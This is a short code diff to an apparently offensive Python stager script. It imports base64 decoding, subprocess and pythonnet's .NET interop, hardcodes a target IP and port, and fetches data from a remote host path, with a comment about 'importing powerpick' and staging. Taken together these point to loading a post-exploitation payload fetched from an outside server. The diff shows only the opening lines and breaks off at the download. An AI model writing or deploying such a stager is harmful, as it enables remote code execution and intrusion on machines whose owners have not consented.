@@ -1,11 +1,12 @@
 import requests
 import subprocess
 import time
-from sys import exit
+import clr  # Part of pythonnet for .NET interop
+
 from base64 import b64decode
 
 global target
-target = "10.109.185.88:8000"
+target = "10.0.0.18:8000"
 
 # importing powerpick, I'm trying to stage as much as I code
 data = requests.get(f"http://{target}/tranfer").text
